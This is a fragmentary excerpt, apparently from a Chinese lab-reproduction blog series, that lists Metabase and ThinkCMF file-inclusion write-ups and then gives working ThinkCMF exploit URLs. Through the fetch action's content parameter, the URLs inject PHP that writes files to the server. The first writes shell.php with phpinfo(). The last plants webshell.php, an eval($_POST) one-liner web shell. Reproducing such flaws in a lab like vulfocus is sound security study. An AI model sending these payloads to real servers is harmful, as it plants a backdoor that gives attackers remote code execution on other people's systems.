...
|[【漏洞复现-metabase-文件包含】vulfocus/metabase-cve_2021_41277](https://blog.csdn.net/qq_53079406/article/details/127338010)|自定义地图中本地文件包含|已发布
|[【漏洞复现-thinkcmf-文件包含】vulfocus/thinkcmf-X1.6.0-X2.2.3](https://blog.csdn.net/qq_53079406/article/details/127310391)|已发布
...
3、content=
设置属性类似
4、file_put_contents('shell.php','&lt;?php phpinfo();?&gt;')
写入函数，天天用的东西
...
<hr/>
2、写入phpinfo()语句
http://ip:port/?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php&gt;file_put_contents('shell.php','&lt;?php phpinfo(); ?&gt;')&lt;/php&gt;
未报错，则表示解析成功了
...
http://ip:port/?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php&gt;file_put_contents('webshell.php','&lt;?php @eval($_POST['123']); ?&gt;')&lt;/php&gt;
